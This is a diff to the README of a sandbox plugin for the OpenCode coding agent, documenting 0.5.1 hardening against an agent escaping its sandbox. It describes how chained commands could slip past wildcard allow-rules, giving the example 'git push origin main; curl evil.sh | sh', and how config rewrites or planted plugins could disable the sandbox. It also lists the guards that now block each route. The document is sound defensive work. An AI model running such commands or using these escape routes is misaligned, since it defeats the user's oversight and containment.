@@ -59,7 +59,10 @@ User config: `~/.config/universal-opencode-sandbox/config.json` (respecting `XDG
   // sandboxed, blocked or prompted - until you set it back to true. The policy
   // is re-read on every tool call, so flipping it takes effect immediately,
   // without a restart. (At plugin load with enabled false nothing is registered
-  // at all; set it back to true and restart the session to re-arm.)
+  // at all; set it back to true and restart the session to re-arm. Likewise the
+  // escape tools are registered at load only when "unsandboxed" is not "deny":
+  // tightening it to "deny" blocks them on the next call, but going from "deny"
+  // to "ask" or "allow" needs a restart to make the tools appear.)
   "enabled": true,
   // "enforce" (default) blocks a command when the sandbox cannot run it;
   // "permissive" runs it unsandboxed with a warning.
@@ -83,8 +86,9 @@ User config: `~/.config/universal-opencode-sandbox/config.json` (respecting `XDG
   "unsandboxed": "deny",
   // Commands pre-approved to run unsandboxed without a prompt, with "*"
   // wildcards. The persistent form of an approval, kept here in your config
-  // where it stays visible and reviewable. Applies in "ask" mode.
-  "unsandboxed_allow": ["git push *", "npm publish*"],
+  // where it stays visible and reviewable. Applies in "ask" mode. A wildcard
+  // pattern only pre-approves a single simple command: see below.
+  "unsandboxed_allow": ["git push *", "npm publish *"],
   // Also sandbox user "!" commands and plugin shells, protecting the user from
   // social engineering ("run this for me") and accidental damage. Default: false.
   "sandbox_user_commands": true,
@@ -143,6 +147,18 @@ its full input in the timeline right above the prompt.
 }
 ```
 
+#### Pre-approving commands with `unsandboxed_allow`
+
+A pattern without a wildcard is an exact match. A pattern with a wildcard
+(`git push *`) pre-approves only a single simple command: anything containing
+`;`, `&`, `|`, a backtick, `$(`, a redirection (`<` or `>`) or a newline falls back
+to the approval prompt, so `git push origin main; curl evil.sh | sh` is never
+silently approved by `git push *`. The check is conservative and does not parse
+quoting, so a quoted `;` inside an argument also asks. Allow rules for the
+`unsandboxed` action in opencode's own permission rules follow the same rule.
+Write the space before the wildcard (`npm publish *`) so the pattern cannot match
+a longer command name such as `npm publishx`.
+
 ### Default denied paths
 
 Without a `denied_paths` entry, the sandbox denies reading and writing these
@@ -178,6 +194,22 @@ too.
 
 - **Filesystem**: in `workspace-write` mode, writes are allowed in the workspace and
   the temp directory only. In `read-only` mode no write is allowed at all.
+- **The sandbox's own files**: per-call request files live in the state directory
+  (`$XDG_STATE_HOME/universal-opencode-sandbox/requests`, by default
+  `~/.local/state/...`; `%LOCALAPPDATA%` on Windows), not in the temp directory,
+  which a sandboxed command can write to. The config and state directories are also
+  passed to the sandbox as read-only paths, so a workspace or writable root that
+  happens to cover your home directory still cannot be used to rewrite the sandbox
+  config or a pending request (enforced on macOS and Linux; ignored on Windows).
+  Request files left behind by an interrupted run are removed after 24 hours.
+- **File tools and the config**: only the `shell` tool is sandboxed; OpenCode's own file
+  tools (`write`, `edit`, `apply_patch`) run in the host process. The plugin therefore
+  refuses any non-shell tool call whose input points at the sandbox's config, state or
+  admin config directory, so an agent cannot switch the sandbox off through a file
+  edit. This is checked on path-like input fields (`filePath`, `path`, `file`,
+  `target`, ... and the file headers inside an `apply_patch` patch), with symlinks
+  resolved. The workspace's own `opencode.json` and `.opencode` are not covered here:
+  editing those stays a normal, visible action under OpenCode's permission system.
 - **Protected paths**: `opencode.json`, `opencode.jsonc`, `.opencode`, `.claude` and
   `.agents` in the workspace can never be written or planted by a sandboxed command,
   so a command cannot install a config or plugin that would run unsandboxed after a
@@ -190,8 +222,24 @@ too.
   `network: "deny"` (the default) sandboxed commands fail closed there with an
   explanation; set `network: "allow"` for filesystem-only containment on Windows.
 - **Fail-closed**: an unsupported platform, a missing backend (install `bubblewrap` on
-  Linux), or a missing executor blocks the command in `enforce` mode instead of
+  Linux), a missing executor, or a request directory that cannot be created (setup
+  never throws; it logs the reason) blocks the command in `enforce` mode instead of
   running it unconfined. `mode: "permissive"` trades that guarantee for convenience.
+
+## 0.5.1 hardening
+
+- Request files moved out of the temp directory into the state directory, and the
+  config and state directories are guarded read-only inside the sandbox.
+- Setup never throws: a failure becomes the "unavailable" state (blocked in
+  `enforce`, a warning in `permissive`).
+- Hot reload is consistent: `enforce`, the Windows network check, the ask guard and
+  `sandbox_user_commands` follow the live config, and tightening `unsandboxed` to
+  `"deny"` blocks an already-registered escape tool.
+- Wildcard `unsandboxed_allow` patterns and session allow rules no longer approve
+  commands with chaining, substitution or redirection syntax.
+- File tools cannot touch the sandbox's own config, state or admin directories.
+- User-command request files are removed on unload, and stale request files are
+  swept at startup.
 
 ## Sandboxed terminal
 
